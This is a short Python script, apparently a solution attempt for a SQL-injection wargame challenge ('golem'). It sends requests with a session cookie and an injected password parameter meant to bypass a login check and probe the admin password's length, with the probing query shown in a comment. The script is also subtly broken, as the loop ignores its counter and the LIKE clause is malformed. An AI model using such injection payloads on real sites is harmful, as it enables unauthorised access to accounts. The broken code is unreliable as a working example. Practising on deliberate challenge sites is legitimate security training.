import requests

url  = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"

session = "qppea09fckikq6btmak1eptr94"

headers  = {
    'Cookie' : f'PHPSESSID={session}'
}

# Find the password length

# select pw from golem where pw = '' or id = 'admin' and length(pw) = i --+
for i in range(50):
    param = f"?pw=' or id='admin' and pw LIKE='12'"
    r = requests.get(url+param,headers=headers)

    print(r.text)

